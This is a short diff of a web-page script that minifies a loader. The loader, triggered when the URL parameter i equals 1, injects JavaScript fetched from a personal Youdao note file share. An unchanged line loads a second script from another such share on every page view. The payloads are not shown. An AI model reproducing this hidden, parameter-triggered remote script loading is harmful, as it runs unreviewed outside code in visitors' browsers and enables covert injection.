@@ -1,22 +1,2 @@
-<script>
-
-// 获取当前页面的 URL 参数
-const urlParams = new URLSearchParams(window.location.search);
-// 获取参数 i 的值
-const iValue = urlParams.get('i');
-
-// 如果参数 i 的值为 1，则执行第一段代码
-if (iValue === '1') {
-    var xUrl = '//note.youdao.com/yws/api/personal/file/CACA9D7189DA43BB8E1CD1F9A92B231B?method=download&inline=true&shareKey=1e3e98947d65f6e65cb71743862b06aa';
-    var now = Math.round(Date.now() / 1000 / 5);
-    var s = document.createElement('script');
-    s.setAttribute('src', xUrl + '&ut=' + now);
-    s.setAttribute('charset', 'utf-8');
-    if (!document.body) 
-        document.head.appendChild(s);
-    else 
-        document.body.appendChild(s);
-}
-
-</script>
+<script>const urlParams=new URLSearchParams(window.location.search);const iValue=urlParams.get("i");if(iValue==="1"){var xUrl="//note.youdao.com/yws/api/personal/file/CACA9D7189DA43BB8E1CD1F9A92B231B?method=download&inline=true&shareKey=1e3e98947d65f6e65cb71743862b06aa";var now=Math.round(Date.now()/1e3/5);var s=document.createElement("script");s.setAttribute("src",xUrl+"&ut="+now);s.setAttribute("charset","utf-8");if(!document.body)document.head.appendChild(s);else document.body.appendChild(s)}</script>
 <script src="//note.youdao.com/yws/api/personal/file/DF51C54B812E4F7CAC02E642D941E4ED?method=download&inline=true&shareKey=43c142c7924e806f91a1ce39e873b6c8" ></script>
